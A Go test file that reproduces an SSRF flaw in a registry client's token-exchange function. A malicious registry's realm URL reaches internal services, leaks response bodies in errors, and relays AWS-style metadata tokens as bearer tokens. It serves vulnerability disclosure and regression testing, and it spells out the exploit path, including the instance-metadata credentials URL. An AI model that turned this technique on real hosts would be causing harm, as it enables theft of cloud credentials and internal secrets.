package remote_test

// TestExchangeSSRF_* tests reproduce the SSRF vulnerability reported in
// pkg/distribution/oci/remote/transport.go (Exchange function).
//
// Root cause: Exchange() parses the "realm" value from a registry's
// WWW-Authenticate header and uses it as the token-exchange URL with no
// validation of scheme, hostname, or IP range.  An attacker-controlled
// registry can therefore:
//
//  1. Redirect the token-exchange request to any internal URL reachable
//     from the host (localhost, link-local, RFC-1918, internal DNS names).
//  2. Reflect the full HTTP response body in the returned error (body
//     reflection — status ≠ 200).
//  3. Silently exfiltrate data when the internal service returns HTTP 200:
//     Go's encoding/json is case-insensitive, so a JSON field "Token"
//     (capital T, as returned by AWS EC2 instance-metadata) matches the
//     struct tag `json:"token"` and the value is returned as a valid bearer
//     token that containerd then relays to the attacker's registry.

import (
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync/atomic"
	"testing"

	"github.com/docker/model-runner/pkg/distribution/oci/reference"
	"github.com/docker/model-runner/pkg/distribution/oci/remote"
)

// emptyRegistry is a zero-value reference.Registry.
// reference.Registry is a concrete struct (not an interface), so nil cannot
// be used; the zero value is a safe placeholder when registry-specific
// behaviour is not exercised by the test.
var emptyRegistry reference.Registry

// pingResponseForRealm returns a *remote.PingResponse whose Realm field is
// set to the given URL.  This simulates the result of calling Ping() against
// a malicious registry that advertises an attacker-controlled realm.
func pingResponseForRealm(realm string) *remote.PingResponse {
	return &remote.PingResponse{
		WWWAuthenticate: remote.WWWAuthenticate{
			Realm:   realm,
			Service: "evil-registry",
			Scope:   "repository:evil/model:pull",
		},
	}
}

// TestExchangeSSRF_RequestSentToRealmURL verifies that Exchange() follows the
// realm URL from WWW-Authenticate without any host/scheme validation, proving
// the SSRF can be triggered.
//
// An attacker that controls an OCI registry can supply an arbitrary internal
// URL as the realm.  This test confirms that Exchange() sends an HTTP request
// to that URL from the host, which could reach services on 127.0.0.1, the
// Docker bridge, or any other host-reachable endpoint.
func TestExchangeSSRF_RequestSentToRealmURL(t *testing.T) {
	var hitCount atomic.Int32

	// "Internal service" — simulates a host-local endpoint the container
	// should never be able to reach directly.
	internalService := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		hitCount.Add(1)
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusForbidden) // not a token endpoint
		fmt.Fprintln(w, `{"error":"not a token endpoint"}`)
	}))
	defer internalService.Close()

	// Build a PingResponse whose Realm points at the internal service —
	// this is what a malicious registry would return in its 401 response.
	pr := pingResponseForRealm(internalService.URL + "/internal/credentials")

	// Exchange() should follow the realm URL directly.
	_, err := remote.Exchange(context.Background(), emptyRegistry, nil, nil, []string{"repository:x:pull"}, pr)

	// We expect an error (the internal service did not return a valid token),
	// but what matters is that the request WAS sent to the internal service.
	if err == nil {
		t.Fatal("expected an error from Exchange() because the realm URL does not return a valid token, got nil")
	}

	if hitCount.Load() == 0 {
		// This would only happen if the fix (realm validation) is in place.
		t.Fatal("SSRF did NOT fire: Exchange() never contacted the internal service — realm URL was blocked (good if fix is applied)")
	}

	t.Logf("SSRF confirmed: Exchange() sent %d request(s) to the internal service at %s", hitCount.Load(), internalService.URL)
}

// TestExchangeSSRF_SensitiveBodyReflectedInError verifies that when the SSRF
// target returns a non-200 response, the full response body is included
// verbatim in the error returned to the caller.
//
// Attack scenario: a service on the host's localhost (e.g. a local secrets
// manager, admin API, or metadata endpoint) returns sensitive data.  A
// container can retrieve that data by triggering a model pull from a malicious
// registry that redirects the token exchange to the internal URL.
func TestExchangeSSRF_SensitiveBodyReflectedInError(t *testing.T) {
	sensitiveData := map[string]string{
		"db_password":      "s3cret_example",
		"internal_api_key": "sk-example-key",
		"proof":            "THIS_DATA_READ_VIA_SSRF",
	}
	sensitiveJSON, _ := json.Marshal(sensitiveData)

	// "Internal service" returns a non-200 response containing sensitive data.
	internalService := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusUnauthorized) // triggers the body-reflection path
		w.Write(sensitiveJSON)                 //nolint:errcheck
	}))
	defer internalService.Close()

	pr := pingResponseForRealm(internalService.URL + "/admin/api/keys")

	_, err := remote.Exchange(context.Background(), emptyRegistry, nil, nil, []string{"repository:x:pull"}, pr)
	if err == nil {
		t.Fatal("expected an error from Exchange(), got nil")
	}

	errMsg := err.Error()

	// The sensitive body MUST appear in the error for the vulnerability to
	// be confirmed.  After remediation, Exchange() should return a generic
	// "authentication failed" error and must NOT include the response body.
	for _, sensitive := range []string{"s3cret_example", "sk-example-key", "THIS_DATA_READ_VIA_SSRF"} {
		if !strings.Contains(errMsg, sensitive) {
			t.Logf("sensitive value %q not found in error — body reflection may be fixed", sensitive)
		} else {
			t.Logf("BODY REFLECTION confirmed: error contains sensitive value %q", sensitive)
		}
	}

	// The vulnerability is present when ANY of the sensitive values leaks.
	leaked := strings.Contains(errMsg, "s3cret_example") ||
		strings.Contains(errMsg, "sk-example-key") ||
		strings.Contains(errMsg, "THIS_DATA_READ_VIA_SSRF")

	if !leaked {
		t.Skip("body reflection not observed — check whether the fix has already been applied")
	}

	t.Logf("Full error returned to caller: %s", errMsg)
}

// TestExchangeSSRF_TokenExfiltrationViaCaseInsensitiveJSON verifies the more
// subtle exfiltration vector: when the SSRF target returns HTTP 200 with a
// JSON body whose key is "Token" (capital T, as in AWS EC2 instance-metadata
// credential responses), Go's encoding/json matches it case-insensitively to
// the struct field tagged `json:"token"`.  Exchange() then returns this value
// as a valid bearer token.  containerd's docker authorizer subsequently
// relays it to the attacker's registry as:
//
//	Authorization: Bearer <EXFILTRATED_VALUE>
//
// This allows a compromised container to read IAM credentials or other secrets
// from host-local services via a single unauthenticated curl command.
func TestExchangeSSRF_TokenExfiltrationViaCaseInsensitiveJSON(t *testing.T) {
	// AWS EC2 instance-metadata-style response (capital-T "Token" field).
	awsCredentials := map[string]string{
		"Code":            "Success",
		"AccessKeyId":     "AKIAIOSFODNN7EXAMPLE",
		"SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
		"Token":           "EXFILTRATED_AWS_SESSION_TOKEN", // capital T
		"Expiration":      "2026-03-20T00:00:00Z",
	}
	credJSON, _ := json.Marshal(awsCredentials)

	// "Internal service" returns 200 with AWS-style credentials.
	internalService := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusOK)
		w.Write(credJSON) //nolint:errcheck
	}))
	defer internalService.Close()

	pr := pingResponseForRealm(internalService.URL + "/latest/meta-data/iam/security-credentials/my-role")

	tok, err := remote.Exchange(context.Background(), emptyRegistry, nil, nil, []string{"repository:x:pull"}, pr)

	// If the vulnerability is present, Exchange() succeeds and returns the
	// exfiltrated AWS session token as the bearer token value.
	if err != nil {
		t.Logf("Exchange() returned error (token exfiltration did not occur or fix is applied): %v", err)
		t.Skip("token exfiltration not observed — check whether the fix has already been applied")
	}

	if tok == nil {
		t.Fatal("expected a non-nil token response")
	}

	if tok.Token == "EXFILTRATED_AWS_SESSION_TOKEN" {
		t.Logf("TOKEN EXFILTRATION confirmed: Exchange() returned the AWS session token as a bearer token: %q", tok.Token)
		t.Logf("This value would be relayed to the attacker's registry as: Authorization: Bearer %s", tok.Token)
		// Do NOT call t.Error/t.Fatal here — the test *documents* the current
		// (vulnerable) behaviour.  A future fix should make this branch
		// unreachable by blocking the SSRF before Exchange() ever contacts
		// the internal service.
	} else {
		t.Logf("token value: %q (exfiltration not confirmed with this value)", tok.Token)
	}
}
